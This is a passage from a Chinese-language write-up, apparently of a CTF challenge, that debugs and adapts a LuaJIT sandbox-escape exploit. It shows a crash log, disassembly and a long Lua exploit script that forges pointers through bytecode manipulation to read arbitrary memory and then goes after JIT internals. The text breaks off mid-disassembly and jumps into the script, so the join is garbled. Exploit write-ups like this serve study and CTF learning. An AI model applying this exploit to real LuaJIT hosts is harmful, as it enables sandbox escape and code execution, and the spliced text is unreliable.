    /* Free all MCode areas. */
    void lj_mcode_free(jit_State *J)
    {
      MCode *mc = J->mcarea;
      J->mcarea = NULL;
      J->szallmcarea = 0;
      while (mc) {
        MCode *next = ((MCLink *)mc)->next;
        mcode_free(J, mc, ((MCLink *)mc)->size);
        mc = next;
      }
    }
    static void mcode_free(jit_State *J, void *p, size_t sz)
    {
      UNUSED(J); UNUSED(sz);
      VirtualFree(p, 0, MEM_RELEASE);
    }
`J`参数没有用到，似乎被优化掉了，所以只传入了两个参数。更漂亮的是在这里直接得到了mcarea在`jit_State`中的偏移，这样应该就可以去对比一下了。
    gef➤  p (uint64_t)(&((GG_State*)0x40000378).J.mcarea)-(uint64_t)(&((GG_State*)0x40000378).J)
    $7 = 0x988
    >>> 0x988
    2440
而函数里的为2448，看来确实是错位了，虽然不知道是什么原因，这里也解释了为什么原exp无法正常使用了。
这样是不是还原到原exp就可以使用了呢？
运行结果：
    [49833.577] 01105.01119>   CS:                   0 RIP:     0x50c8d6669d70 EFL:              0x286 CR2:                  0
    [49833.577] 01105.01119>  RAX:         0xffffffff RBX: 0x9090909090909090 RCX:     0x7e0029445a42 RDX:                  0
    [49833.577] 01105.01119>  RSI:                  0 RDI: 0x9090909090909090 RBP:      0x9b703aacc60 RSP:      0x9b703aacc50
    [49833.577] 01105.01119>   R8:                  0  R9:                  0 R10:                  0 R11:              0x206
    [49833.577] 01105.01119>  R12:         0x10000558 R13:         0x100003b8 R14:
    [49833.593] 01105.01119> bt#01: pc 0x50c8d6669d70 sp 0x9b703aacc50 (app:/pkg/bin/frawler,0x2bd70)
    [49833.593] 01105.01119> bt#02: pc 0x50c8d66600d4 sp 0x9b703aacc70 (app:/pkg/bin/frawler,0x220d4)
    [49833.594] 01105.01119> bt#03: pc 0x50c8d6677b81 sp 0x9b703aaccb0 (app:/pkg/bin/frawler,0x39b81)
真正麻烦的来了，这里访问了无效内存，rdi的值变为了0x909090，明显是我们填入的nop的值，可是为什么nop的值变成了这里的rdi，也就是`mcarea`？这个时候没有调试器就显得非常难受了，往回追溯一下，上一层调用到`lj_mcode_free`的位置：
    LOAD:00000000000220A1
    LOAD:00000000000220A1 loc_220A1:
    LOAD:00000000000220A1 mov     word ptr [r13+1F0h], 0
    LOAD:00000000000220AB mov     dword ptr [r13+2E0h], 0
    LOAD:00000000000220B6 lea     rdi, [r13+870h] ; s
    LOAD:00000000000220BD xor     r14d, r14d
    LOAD:00000000000220C0 mov     edx, 200h       ; n
    LOAD:00000000000220C5 xor     esi, esi        ; c
    LOAD:00000000000220C7 call    _memset
    LOAD:00000000000220CC mov     rdi, r12 ; : NULL`.
          -- The `if false` wrapper ensures that the munged bytecode
          -- isn't executed.
          local cdata = -32749
          cdata = 0
          cdata = 0
        end
        -- Through the power of bytecode manipulation, the
        -- following three functions will become (the fast paths of)
        -- string.byte, string.char, and string.sub. This is
        -- possible because LuaJIT has bytecode instructions
        -- corresponding to the fast paths of said functions. Note
        -- that we musn't stray from the fast path (because the
        -- fallback C code won't be wired up). Also note that the
        -- interpreter state will be slightly messed up after
        -- calling one of these functions.
        local function s_byte(s) end
        local function s_char(i, _) end
        local function s_sub(s, i, j) end
        -- The following function does nothing, but calling it will
        -- restore the interpreter state which was messed up following
        -- a call to one of the previous three functions. Because this
        -- function contains a cdata literal, loading it from bytecode
        -- will result in the ffi library being initialised (but not
        -- registered in the global namespace).
        local function resync() return 0LL end
        -- Helper function to reinterpret the first four bytes of a
        -- string as a uint32_t, and return said value as a number.
        local function s_uint32(s)
          local result = 0
          for i = 4, 1, -1 do
            result = result * 256 + s_byte(s_sub(s, i, i))
            resync()
          end
          return result
        end
        -- The following line obtains the address of the GCfuncL
        -- object corresponding to "inner". As written, it just fetches
        -- the 0th upvalue, and does some arithmetic. After some
        -- bytecode manipulation, the 0th upvalue ends up pointing
        -- somewhere very interesting: the frame info TValue containing
        -- func|FRAME_VARG|delta. Because delta is small, this TValue
        -- will end up being a denormalised number, from which we can
        -- easily pull out 32 bits to give us the "func" part.
        local iaddr = (inner * 2^1022 * 2^52) % 2^32
        -- The following five lines read the "pc" field of the GCfuncL
        -- we just obtained. This is done by creating a GCstr object
        -- overlaying the GCfuncL, and then pulling some bytes out of
        -- the string. Bytecode manipulation results in a nice KPRI
        -- instruction which preserves the low 32 bits of the istr
        -- TValue while changing the high 32 bits to specify that the
        -- low 32 bits contain a GCstr*.
        local istr = (iaddr - 4) + 2^52
        istr = -32764 -- Turned into KPRI(str)
        local pc = s_sub(istr, 5, 8)
        istr = resync()
        pc = s_uint32(pc)
        -- The following three lines result in the local variable
        -- called "memory" being `cdata: NULL`. We can
        -- subsequently use this variable to read arbitrary memory
        -- (one byte at a time). Note again the KPRI trick to change
        -- the high 32 bits of a TValue. In this case, the low 32 bits
        -- end up pointing to the bytecode instructions at the top of
        -- this function wrapped in `if false`.
        local memory = (pc + 8) + 2^52
        memory = -32758 -- Turned into KPRI(cdata)
        memory = memory + 0
        -- Helper function to read a uint32_t from any memory location.
        local function m_uint32(offs)
          local result = 0
          for i = offs + 3, offs, -1 do
            result = result * 256 + (memory[i] % 256)
          end
          return result
        end
        -- Helper function to extract the low 32 bits of a TValue.
        -- In particular, for TValues containing a GCobj*, this gives
        -- the GCobj* as a uint32_t. Note that the two memory reads
        -- here are GCfuncL::uvptr[1] and GCupval::v.
        local vaddr = m_uint32(m_uint32(iaddr + 24) + 16)
        local function low32(tv)
          v = tv
          return m_uint32(vaddr)
        end
        -- Helper function which is the inverse of s_uint32: given a
        -- 32 bit number, returns a four byte string.
        local function ub4(n)
          local result = ""
          for i = 0, 3 do
            local b = n % 256
            n = (n - b) / 256
            result = result .. s_char(b)
            resync()
          end
          return result
        end
        local function hexdump_print(addr, len)
            local result = ''
            for i = 0, len - 1 do
                if i % 16 == 0 and i ~= 0 then
                    result = result .. '\n'
                end
                result = result .. string.format('%02x', memory[addr + i] % 0x100) .. ' '
            end
            print(result)
        end
        -- The following four lines result in the local variable
        -- called "mctab" containing a very special table: the
        -- array part of the table points to the current Lua
        -- universe's jit_State::patchins field. Consequently,